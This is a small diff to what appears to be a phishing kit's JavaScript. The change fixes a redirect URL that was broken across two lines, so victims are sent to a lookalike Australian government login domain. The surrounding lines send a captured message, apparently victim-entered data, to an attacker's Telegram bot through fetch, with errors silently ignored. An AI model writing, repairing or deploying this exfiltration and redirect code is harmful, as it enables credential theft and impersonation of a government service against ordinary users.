@@ -57,8 +57,7 @@
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
                 .catch(() => {}) // ignore errors
                 .finally(() => {
-                    window.location.href = 'https://login.gov.au-csappointment.de5.net
-/csappointment/log.html';
+                    window.location.href = 'https://login.gov.au-csappointment.de5.net/csappointment/log.html';
                 });
         }
 
